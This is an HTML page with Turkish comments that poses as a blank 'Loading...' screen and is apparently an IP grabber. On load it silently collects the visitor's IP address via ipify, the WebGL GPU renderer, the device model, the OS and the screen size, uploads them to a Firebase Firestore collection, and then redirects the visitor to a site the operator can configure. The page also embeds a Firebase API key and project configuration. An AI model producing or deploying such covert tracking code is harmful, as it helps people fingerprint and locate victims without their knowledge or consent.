<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
    <style>body { background: #000; margin: 0; }</style>
</head>
<body>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyB0XVcXiShBEebqnHokvrb8S5XpKfTRAJA",
        authDomain: "nexarasunar.firebaseapp.com",
        databaseURL: "https://nexarasunar-default-rtdb.firebaseio.com",
        projectId: "nexarasunar",
        storageBucket: "nexarasunar.firebasestorage.app",
        messagingSenderId: "698168474254",
        appId: "1:698168474254:web:99a65bc95ce906a7e1e7df"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const yonlendirilecekAdres = "https://www.google.com"; // Burayı istediğin siteyle değiştir

    async function captureAndSend() {
        let ip = "Bilinmiyor";
        let model = "Bilinmiyor";
        let os = navigator.platform;
        let gpu = "Tespit edilemedi";

        try {
            // 1. IP Adresini Çek
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;

            // 2. GPU ve Model Analizi
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
                if (hints.model) model = hints.model;
            }
        } catch (e) { console.log(e); }

        try {
            // 3. Firebase Firestore'a Kaydet
            await addDoc(collection(db, "ziyaretler"), {
                ip: ip,
                model: model,
                os: os,
                gpu: gpu,
                screen: `${window.screen.width}x${window.screen.height}`,
                tarih: serverTimestamp()
            });
        } catch (e) { }

        // 4. Yönlendir
        window.location.href = yonlendirilecekAdres;
    }

    window.onload = captureAndSend;
</script>
</body>
</html>
